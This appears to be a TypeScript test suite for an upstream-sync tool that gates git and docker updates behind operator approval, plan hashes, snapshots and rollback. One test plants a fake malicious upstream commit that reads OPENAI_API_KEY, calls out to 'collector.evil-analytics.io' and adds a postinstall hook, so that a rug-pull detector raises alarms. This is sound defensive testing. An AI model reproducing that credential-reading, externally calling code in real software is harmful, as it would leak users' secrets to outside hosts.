// UPSTREAM-SYNC-01 red->green: fixture upstream (bare repo) + local clone target.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { KNOWN_REGISTRY_SCOPES } from "../src/registryScopeGrant.ts";
import { diffContract, parseImageRef, readTargets, registryDigest, runUpstream, sanitizeUrl, scanAddedLines, UPSTREAM_APPLY_SCOPE, UPSTREAM_BOOTSTRAP_FILE, UPSTREAM_RULES_FILE, worktreeDigest, type DockerPort, type UpstreamDeps } from "../src/upstreamSync.ts";

const OPERATOR = { subject: "operator-2026-09-28-test", scopes: ["engineering:read", UPSTREAM_APPLY_SCOPE], tokenHash16: "0123456789abcdef" };
const HERMES = { subject: "hermes-2026-09", scopes: ["engineering:read", "engineering:write"], tokenHash16: "fedcba9876543210" };

function g(cwd: string, ...args: string[]): string {
  return execFileSync("git", ["-c", "user.name=fixture", "-c", "user.email=f@x", "-c", "init.defaultBranch=main", ...args], { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
}
function commitFile(repo: string, file: string, content: string, msg: string) {
  mkdirSync(join(repo, file, ".."), { recursive: true });
  writeFileSync(join(repo, file), content);
  g(repo, "add", "-A"); g(repo, "commit", "-q", "-m", msg);
}

type Fx = { root: string; upstream: string; work: string; target: string; data: string; deps: UpstreamDeps; marker: string };
function fixture(opts: { restart?: "command" | "systemd" | "pipeline"; smokeFail?: boolean; policy?: "git-tag" | "git-tag+tar"; contract?: boolean } = {}): Fx {
  const root = mkdtempSync(join(tmpdir(), "upstream-sync-"));
  const home = join(root, "home"); mkdirSync(home);
  writeFileSync(join(home, ".gitconfig"), "[user]\n\tname = fixture\n\temail = f@x\n");
  process.env.HOME = home;
  const upstream = join(root, "upstream.git"); const work = join(root, "author"); const target = join(root, "target"); const data = join(root, "data");
  mkdirSync(upstream); g(upstream, "init", "--bare", "-q");
  mkdirSync(work); g(work, "init", "-q");
  commitFile(work, "src/app.js", "export const v = 1;\n", "v1");
  commitFile(work, "package.json", JSON.stringify({ name: "fx", version: "1.0.0" }, null, 2), "manifest");
  if (opts.contract) commitFile(work, "tools.json", JSON.stringify({ tools: [{ name: "alpha", inputSchema: { type: "object", properties: { q: { type: "string" } } } }, { name: "beta", inputSchema: { type: "object" } }] }), "contract v1");
  g(work, "remote", "add", "origin", upstream); g(work, "push", "-q", "origin", "main");
  g(root, "clone", "-q", upstream, target);
  const marker = join(root, "restarted.marker");
  const restart = opts.restart === "systemd" ? { kind: "systemd", unit: "fixture.service" } : opts.restart === "pipeline" ? { kind: "pipeline" } : { kind: "command", argv: ["sh", "-c", `echo restarted >> ${marker}`] };
  const targets = {
    version: 1,
    targets: [{
      id: "fx", kind: "git", source: { url: `file://${upstream}`, branch: "main" }, localPath: target, credential: null, lockfiles: ["package.json"],
      adapter: { rebuild: null, restart, smoke: { commands: [{ argv: opts.smokeFail ? ["sh", "-c", "exit 3"] : ["sh", "-c", "grep -q export src/app.js"] }], health: null }, contractRef: opts.contract ? { kind: "file", path: "tools.json" } : null },
      snapshotPolicy: opts.policy ?? "git-tag", tier3Owner: "operator"
    }]
  };
  mkdirSync(data);
  writeFileSync(join(data, "upstream-targets.json"), JSON.stringify(targets));
  return { root, upstream, work, target, data, marker, deps: { dataDir: data, caller: OPERATOR, judgeVerify: null } };
}
function pushUpstream(fx: Fx, file: string, content: string, msg: string) { commitFile(fx.work, file, content, msg); g(fx.work, "push", "-q", "origin", "main"); }
const head = (repo: string) => g(repo, "rev-parse", "HEAD");
const refsSnapshot = (repo: string) => g(repo, "for-each-ref", "--format=%(refname) %(objectname)");

test("check detects a pending upstream update (commits + lockfile diff) with ZERO mutation of the target", async () => {
  const fx = fixture();
  pushUpstream(fx, "package.json", JSON.stringify({ name: "fx", version: "1.1.0", dependencies: { lodash: "4.17.21" } }, null, 2), "deps: add lodash");
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const before = { head: head(fx.target), refs: refsSnapshot(fx.target), status: g(fx.target, "status", "--porcelain") };
  const r = await runUpstream({ verb: "check", target: "fx" }, { ...fx.deps, caller: HERMES }) as any;
  assert.equal(r.status, "CHECKED");
  const c = r.results[0];
  assert.equal(c.status, "UPDATE_AVAILABLE");
  assert.equal(c.behind, 2); assert.equal(c.ahead, 0);
  assert.deepEqual(c.commits.map((x: any) => x.subject), ["v2", "deps: add lodash"]);
  assert.equal(c.lockfileDiff[0].path, "package.json");
  assert.ok(c.riskNotes.some((n: string) => n.startsWith("DEPENDENCY_CHANGE")));
  assert.deepEqual({ head: head(fx.target), refs: refsSnapshot(fx.target), status: g(fx.target, "status", "--porcelain") }, before, "target untouched");
  assert.equal(c.zeroMutation.headUnchanged && c.zeroMutation.refsUnchanged && c.zeroMutation.statusUnchanged, true);
  assert.ok(existsSync(join(fx.data, "audit", "upstream-sync.jsonl")));
  // up-to-date + all sweep
  g(fx.target, "pull", "-q", "--ff-only");
  const r2 = await runUpstream({ verb: "check", target: "all" }, fx.deps) as any;
  assert.equal(r2.results[0].status, "UP_TO_DATE");
});

test("check reports local carried commits and dirty tree as riskNotes; untrusted commit subjects are neutralized", async () => {
  const fx = fixture();
  commitFile(fx.target, "LOCAL.md", "carried\n", "local carried patch");
  writeFileSync(join(fx.target, "src/app.js"), "dirty\n");
  pushUpstream(fx, "README.md", "hi\n", `upstream \u{E0041}\u{E0042} hidden`);
  const c = (await runUpstream({ verb: "check", target: "fx" }, fx.deps) as any).results[0];
  assert.equal(c.ahead, 1); assert.equal(c.behind, 1);
  assert.ok(c.riskNotes.some((n: string) => n.startsWith("LOCAL_CARRIED_COMMITS")));
  assert.ok(c.riskNotes.some((n: string) => n.startsWith("TARGET_DIRTY")));
  assert.match(c.commits[0].subject, /⟦U\+E0041⟧/);
  assert.equal(readFileSync(join(fx.target, "src/app.js"), "utf8"), "dirty\n");
});

test("plan: rug-pull detector alarms (telemetry, install hook, credential, contract removed/renamed/schema) + judge advisory + fail-open", async () => {
  const fx = fixture({ contract: true });
  pushUpstream(fx, "src/telemetry.js", "import posthog from 'posthog-js';\nconst k = process.env.OPENAI_API_KEY;\nfetch('https://collector.evil-analytics.io/ingest');\n", "chore: small refactor");
  pushUpstream(fx, "package.json", JSON.stringify({ name: "fx", version: "1.0.1", scripts: { postinstall: "node x.js" } }, null, 2), "bump");
  pushUpstream(fx, "tools.json", JSON.stringify({ tools: [{ name: "alpha2", inputSchema: { type: "object", properties: { q: { type: "string" } } } }, { name: "gamma", inputSchema: {} }] }), "contract tweak");
  let judgeCalls = 0;
  const p = await runUpstream({ verb: "plan", target: "fx" }, { ...fx.deps, judgeVerify: async (input) => { judgeCalls++; assert.equal(input.claims.length, 4); return { aggregate: "HAS_CONTRADICTIONS", claims: [] }; } }) as any;
  assert.equal(p.status, "PLAN");
  const codes = new Set(p.alarms.map((a: any) => a.code));
  for (const c of ["UP-TELE-001", "UP-HOOK-001", "UP-CRED-001", "UP-NET-001", "CONTRACT_TOOL_REMOVED", "CONTRACT_TOOL_RENAMED", "CONTRACT_TOOL_ADDED"]) assert.ok(codes.has(c), `missing ${c}`);
  assert.equal(p.rugPull.verdict, "ALARM");
  assert.equal(p.judge.ran, true); assert.equal(p.judge.verdict, "HAS_CONTRADICTIONS"); assert.equal(judgeCalls, 1);
  assert.equal(p.impact.mergeLayerPredicted, "AUTO_FF");
  assert.equal(p.recommendation.action, "REVIEW_ALARMS_BEFORE_APPLY");
  assert.match(p.planHash, /^[0-9a-f]{16}$/);
  const failOpen = await runUpstream({ verb: "plan", target: "fx" }, { ...fx.deps, judgeVerify: async () => { throw new Error("JUDGE_TIMEOUT"); } }) as any;
  assert.equal(failOpen.judge.verdict, "unavailable");
  assert.equal(failOpen.planHash, p.planHash, "judge never changes the plan hash");
  const noJudge = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  assert.equal(noJudge.judge.verdict, "unavailable");
});

test("apply is TIER-3: no scope / non-operator / no execute / no approval / stale plan hash — all without mutation", async () => {
  const fx = fixture();
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const h0 = head(fx.target); const refs0 = refsSnapshot(fx.target);
  const noScope = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true } }, { ...fx.deps, caller: HERMES }) as any;
  assert.equal(noScope.code, "AUTHORIZATION_SCOPE_REQUIRED");
  const notOp = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true } }, { ...fx.deps, caller: { ...HERMES, scopes: [UPSTREAM_APPLY_SCOPE] } }) as any;
  assert.equal(notOp.code, "OPERATOR_SUBJECT_REQUIRED");
  const plan = await runUpstream({ verb: "apply", target: "fx" }, fx.deps) as any;
  assert.equal(plan.status, "PLAN"); assert.equal(plan.mutationPerformed, false);
  const noApproval = await runUpstream({ verb: "apply", target: "fx", execute: true, expectedPlanHash: plan.planHash }, fx.deps) as any;
  assert.equal(noApproval.code, "TIER3_APPROVAL_REQUIRED");
  const noHash = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true } }, fx.deps) as any;
  assert.equal(noHash.code, "PLAN_HASH_REQUIRED");
  pushUpstream(fx, "src/app.js", "export const v = 3;\n", "v3 (after the plan)");
  const stale = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, fx.deps) as any;
  assert.equal(stale.code, "PLAN_HASH_MISMATCH");
  assert.equal(head(fx.target), h0); assert.equal(refsSnapshot(fx.target), refs0);
  assert.equal(existsSync(fx.marker), false, "no restart ever ran");
});

test("apply with approval: snapshot BEFORE merge, AUTO_FF, restart, smoke; rollback returns byte-identical", async () => {
  const fx = fixture();
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  pushUpstream(fx, "src/new.js", "export const n = 1;\n", "feat: new");
  const h0 = head(fx.target); const digest0 = worktreeDigest(fx.target); const upstreamHead = g(fx.upstream, "rev-parse", "main");
  const plan = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  const phases: string[] = [];
  const r = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, { ...fx.deps, onPhase: (p) => phases.push(p) }) as any;
  assert.equal(r.status, "APPLIED", JSON.stringify(r));
  assert.deepEqual(phases, ["snapshot-created", "fetched", "merged:AUTO_FF", "restarted", "smoke-pass", "applied"]);
  assert.equal(head(fx.target), upstreamHead);
  assert.equal(g(fx.target, "rev-parse", `${r.snapshot.tag}^{commit}`), h0, "snapshot tag points at the pre-merge head");
  assert.equal(readFileSync(fx.marker, "utf8"), "restarted\n");
  assert.equal(g(fx.target, "branch", "--list", "upstream-sync/*"), "", "temporary source branch cleaned up");
  const rbNoScope = await runUpstream({ verb: "rollback", target: "fx", execute: true, approval: { approved: true } }, { ...fx.deps, caller: HERMES }) as any;
  assert.equal(rbNoScope.code, "AUTHORIZATION_SCOPE_REQUIRED");
  const rbPlan = await runUpstream({ verb: "rollback", target: "fx" }, fx.deps) as any;
  assert.equal(rbPlan.status, "PLAN"); assert.equal(head(fx.target), upstreamHead);
  const rb = await runUpstream({ verb: "rollback", target: "fx", execute: true, approval: { approved: true } }, fx.deps) as any;
  assert.equal(rb.status, "ROLLED_BACK", JSON.stringify(rb));
  assert.equal(rb.byteIdentical, true);
  assert.equal(head(fx.target), h0);
  assert.equal(worktreeDigest(fx.target), digest0, "worktree byte-identical to the snapshot");
  assert.equal(readFileSync(fx.marker, "utf8"), "restarted\nrestarted\n");
  const again = await runUpstream({ verb: "rollback", target: "fx" }, fx.deps) as any;
  assert.equal(again.code, "NO_APPLIED_SNAPSHOT");
  const lines = readFileSync(join(fx.data, "audit", "upstream-sync.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  const idx = (res: string) => lines.findIndex((l) => l.verb === "apply" && l.result === res);
  assert.ok(idx("snapshot-created") < idx("merged:AUTO_FF"), "audit proves snapshot before merge");
});

test("git-tag+tar policy restores the tree after a NATIVE merge (local carried commit) — tar + tag byte-identical", async () => {
  const fx = fixture({ policy: "git-tag+tar" });
  commitFile(fx.target, "LOCAL.md", "carried\n", "local carried patch");
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const h0 = head(fx.target); const digest0 = worktreeDigest(fx.target);
  const plan = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  assert.equal(plan.impact.mergeLayerPredicted, "NATIVE");
  const r = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, fx.deps) as any;
  assert.equal(r.status, "APPLIED", JSON.stringify(r));
  assert.equal(r.merge.layer, "NATIVE");
  const rb = await runUpstream({ verb: "rollback", target: "fx", execute: true, approval: { approved: true } }, fx.deps) as any;
  assert.equal(rb.byteIdentical, true); assert.equal(head(fx.target), h0); assert.equal(worktreeDigest(fx.target), digest0);
});

test("overlapping changes = ASSISTED: never merged, snapshot aborted, target untouched", async () => {
  const fx = fixture();
  commitFile(fx.target, "src/app.js", "export const v = 'local';\n", "local edit");
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const h0 = head(fx.target);
  const plan = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  assert.equal(plan.impact.mergeLayerPredicted, "ASSISTED");
  const r = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, fx.deps) as any;
  assert.equal(r.status, "MERGE_NOT_APPLIED"); assert.equal(r.merge.layer, "ASSISTED");
  assert.equal(head(fx.target), h0);
  assert.equal(existsSync(fx.marker), false);
});

test("smoke failure after apply = automatic rollback to the snapshot", async () => {
  const fx = fixture({ smokeFail: true });
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const h0 = head(fx.target);
  const plan = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  const r = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, fx.deps) as any;
  assert.equal(r.status, "ROLLED_BACK_AFTER_FAILURE"); assert.equal(r.failedPhase, "smoke");
  assert.equal(r.rollback.byteIdentical, true);
  assert.equal(head(fx.target), h0);
});

test("host (systemd) and pipeline adapters are refused before ANY mutation", async () => {
  for (const kind of ["systemd", "pipeline"] as const) {
    const fx = fixture({ restart: kind });
    pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
    const refs0 = refsSnapshot(fx.target);
    const plan = await runUpstream({ verb: "apply", target: "fx" }, fx.deps) as any;
    assert.equal(plan.card.applyExecutable.executable, false);
    const r = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, fx.deps) as any;
    assert.equal(r.code, kind === "systemd" ? "HOST_ADAPTER_REQUIRED" : "PIPELINE_ADAPTER");
    assert.equal(refsSnapshot(fx.target), refs0, "no snapshot tag, no fetch into the target");
  }
});

test("one lock per target: a held lock refuses, a different target syncs in parallel", async () => {
  const fx = fixture();
  pushUpstream(fx, "src/app.js", "export const v = 2;\n", "v2");
  const targets = JSON.parse(readFileSync(join(fx.data, "upstream-targets.json"), "utf8"));
  const clone2 = join(fx.root, "target2"); g(fx.root, "clone", "-q", fx.upstream, clone2); g(clone2, "reset", "-q", "--hard", "HEAD~1");
  targets.targets.push({ ...targets.targets[0], id: "fx-two", localPath: clone2 });
  writeFileSync(join(fx.data, "upstream-targets.json"), JSON.stringify(targets));
  mkdirSync(join(fx.data, "upstream", "locks"), { recursive: true });
  writeFileSync(join(fx.data, "upstream", "locks", "fx.lock"), "{}");
  const p1 = await runUpstream({ verb: "plan", target: "fx" }, fx.deps) as any;
  const held = await runUpstream({ verb: "apply", target: "fx", execute: true, approval: { approved: true }, expectedPlanHash: p1.planHash }, fx.deps) as any;
  assert.equal(held.code, "UPSTREAM_LOCK_HELD");
  const p2 = await runUpstream({ verb: "plan", target: "fx-two" }, fx.deps) as any;
  const ok = await runUpstream({ verb: "apply", target: "fx-two", execute: true, approval: { approved: true }, expectedPlanHash: p2.planHash }, fx.deps) as any;
  assert.equal(ok.status, "APPLIED");
  assert.equal(existsSync(join(fx.data, "upstream", "locks", "fx-two.lock")), false, "lock released");
});

test("targets registry = config: bootstrap list, tier-3 upsert PLAN/approval with sha precondition, invalid entry refused", async () => {
  const data = mkdtempSync(join(tmpdir(), "upstream-targets-"));
  const deps: UpstreamDeps = { dataDir: data, caller: OPERATOR };
  const list = await runUpstream({ verb: "targets" }, { ...deps, caller: HERMES }) as any;
  assert.equal(list.source, "bootstrap");
  assert.deepEqual(list.targets.map((t: any) => t.id), ["hermes-agent", "engmcp"]);
  assert.equal(list.targets[0].adapter.restart.kind, "systemd");
  const entry = { id: "mcpguard", kind: "git", source: { url: "https://github.com/arunmm8335/mcpguard.git" }, localPath: "/opt/memoryos/eng-mcp/node_modules/@arunmm8335/mcpguard", adapter: { restart: { kind: "none" }, smoke: {} }, snapshotPolicy: "git-tag", tier3Owner: "operator" };
  const denied = await runUpstream({ verb: "targets", action: "upsert", entry }, { ...deps, caller: HERMES }) as any;
  assert.equal(denied.code, "AUTHORIZATION_SCOPE_REQUIRED");
  const plan = await runUpstream({ verb: "targets", action: "upsert", entry }, deps) as any;
  assert.equal(plan.status, "PLAN"); assert.equal(existsSync(join(data, "upstream-targets.json")), false);
  const bad = await runUpstream({ verb: "targets", action: "upsert", entry, execute: true, approval: { approved: true }, expectedRegistrySha16: "0000000000000000" }, deps) as any;
  assert.equal(bad.code, "REGISTRY_SHA_MISMATCH");
  const w = await runUpstream({ verb: "targets", action: "upsert", entry, execute: true, approval: { approved: true }, expectedRegistrySha16: "bootstrap" }, deps) as any;
  assert.equal(w.status, "WRITTEN");
  assert.deepEqual(readTargets(deps).file.targets.map((t) => t.id), ["hermes-agent", "engmcp", "mcpguard"]);
  const invalid = await runUpstream({ verb: "targets", action: "upsert", entry: { ...entry, source: { url: "http://insecure" } }, execute: true, approval: { approved: true }, expectedRegistrySha16: w.registrySha16After }, deps) as any;
  assert.equal(invalid.code, "TARGET_INVALID");
});

test("bootstrap entries: hermes-agent (git, systemd, :ro) and engmcp (pipeline) validate; the URL is never reported with userinfo", () => {
  const f = JSON.parse(readFileSync(UPSTREAM_BOOTSTRAP_FILE, "utf8"));
  assert.equal(f.targets.length, 2);
  assert.equal(sanitizeUrl("https://user:tok@github.com/a/b.git"), "https://github.com/a/b.git");
  const rules = JSON.parse(readFileSync(UPSTREAM_RULES_FILE, "utf8")).rules;
  for (const r of rules) new RegExp(r.pattern, r.flags ?? "");
  assert.ok(KNOWN_REGISTRY_SCOPES.includes(UPSTREAM_APPLY_SCOPE));
});

test("rug-pull unit: added-lines scanner ignores removed lines; contract diff detects rename by schema", () => {
  const rules = JSON.parse(readFileSync(UPSTREAM_RULES_FILE, "utf8")).rules.map((r: any) => ({ ...r, re: new RegExp(r.pattern, r.flags ?? "") }));
  const alarms = scanAddedLines("+++ b/x.js\n-import posthog\n+const a = 1;\n", rules);
  assert.equal(alarms.length, 0);
  const d = diffContract([{ name: "a", inputSchema: { x: 1 } }], [{ name: "b", inputSchema: { x: 1 } }]);
  assert.deepEqual(d.alarms.map((a) => a.code), ["CONTRACT_TOOL_RENAMED"]);
});

test("docker: registry digest via anonymous bearer challenge; check/apply/rollback through the docker port", async () => {
  assert.deepEqual(parseImageRef("nginx:1.27"), { registry: "registry-1.docker.io", repository: "library/nginx", reference: "1.27", display: "registry-1.docker.io/library/nginx:1.27" });
  const digest = `sha256:${"b".repeat(64)}`;
  let tokenAsked = 0;
  const fetchImpl = (async (url: string | URL, init?: RequestInit) => {
    const u = String(url);
    if (u.startsWith("https://auth.example/token")) { tokenAsked++; assert.match(u, /scope=repository%3Alibrary%2Fnginx%3Apull/); return new Response(JSON.stringify({ token: "anon" }), { status: 200 }); }
    const auth = (init?.headers as Record<string, string>)?.authorization;
    if (!auth) return new Response(null, { status: 401, headers: { "www-authenticate": 'Bearer realm="https://auth.example/token",service="registry.docker.io",scope="repository:library/nginx:pull"' } });
    return new Response(null, { status: 200, headers: { "docker-content-digest": digest } });
  }) as typeof fetch;
  assert.equal(await registryDigest("nginx:1.27", fetchImpl), digest);
  assert.equal(tokenAsked, 1);
  const tags: [string, string][] = [];
  let pulled = false;
  const docker: DockerPort = {
    imageOf: async () => ({ imageRef: "nginx:1.27", imageId: "sha256:old" }),
    repoDigests: async () => [`nginx@sha256:${"a".repeat(64)}`],
    pull: async () => { pulled = true; return { imageId: "sha256:new" }; },
    tag: async (s, d) => { tags.push([s, d]); }
  };
  const data = mkdtempSync(join(tmpdir(), "upstream-docker-"));
  writeFileSync(join(data, "upstream-targets.json"), JSON.stringify({ version: 1, targets: [{ id: "web", kind: "docker", source: { image: "nginx:1.27" }, container: "web", adapter: { restart: { kind: "none" }, smoke: { commands: [{ argv: ["true"] }] } }, snapshotPolicy: "docker-digest", tier3Owner: "operator" }] }));
  const deps: UpstreamDeps = { dataDir: data, caller: OPERATOR, fetchImpl, docker };
  const c = (await runUpstream({ verb: "check", target: "web" }, deps) as any).results[0];
  assert.equal(c.status, "UPDATE_AVAILABLE");
  const noPort = (await runUpstream({ verb: "check", target: "web" }, { ...deps, docker: null }) as any).results[0];
  assert.equal(noPort.status, "CURRENT_UNKNOWN");
  const plan = await runUpstream({ verb: "plan", target: "web" }, deps) as any;
  const r = await runUpstream({ verb: "apply", target: "web", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, deps) as any;
  assert.equal(r.status, "APPLIED");
  assert.ok(tags[0][1].startsWith("upstream-sync-snapshot/web:"), "snapshot tag before pull");
  assert.ok(pulled);
  const rb = await runUpstream({ verb: "rollback", target: "web", execute: true, approval: { approved: true } }, deps) as any;
  assert.equal(rb.status, "ROLLED_BACK");
  assert.deepEqual(tags[1], ["sha256:old", "nginx:1.27"]);
  const refusal = await runUpstream({ verb: "apply", target: "web", execute: true, approval: { approved: true }, expectedPlanHash: plan.planHash }, { ...deps, docker: null }) as any;
  assert.equal(refusal.code, "DOCKER_UNAVAILABLE");
});

test("release deploy: read-only upstream mounts only when :ro, absolute and existing", async () => {
  const m = await import("../scripts/eng-mcp-release.mjs");
  const args = m.readOnlyMountArgs({ readOnlyMounts: ["/src/a:/src/a:ro", "/missing:/missing:ro", "/rw:/rw", "/x/../y:/y:ro", "rel:/r:ro"] }, (p: string) => p !== "/missing");
  assert.deepEqual(args, ["-v", "/src/a:/src/a:ro"]);
});
